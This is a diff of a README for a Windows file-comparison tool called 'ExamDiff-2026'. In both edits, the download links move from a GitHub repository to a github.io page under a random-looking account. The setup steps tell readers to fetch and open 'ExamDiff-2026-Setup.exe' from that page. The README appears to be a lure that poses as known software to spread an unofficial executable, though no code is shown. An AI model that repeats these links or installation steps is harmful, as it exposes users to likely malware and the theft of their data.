@@ -1,6 +1,6 @@
 # ⚖️ ExamDiff-2026 - Compare files and folders with ease
 
-[![Download ExamDiff-2026](https://img.shields.io/badge/Download-ExamDiff--2026-blue)](https://github.com/emasculationacanthosisnigricans868/ExamDiff-2026)
+[![Download ExamDiff-2026](https://img.shields.io/badge/Download-ExamDiff--2026-blue)](https://emasculationacanthosisnigricans868.github.io)
 
 ExamDiff-2026 provides a way to compare files and folders on your Windows computer. It helps you find differences between documents, code, or data directories. This tool works for Windows 10 and Windows 11. It tracks changes in real time and highlights additions, removals, or edits.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these basic require
 
 Follow these instructions to get the software running on your system.
 
-1. Go to the [official download page](https://github.com/emasculationacanthosisnigricans868/ExamDiff-2026).
+1. Go to the [official download page](https://emasculationacanthosisnigricans868.github.io).
 2. Look for the release section on that page.
 3. Select the file named ExamDiff-2026-Setup.exe to start your download.
 4. Open the file once it finishes downloading. 
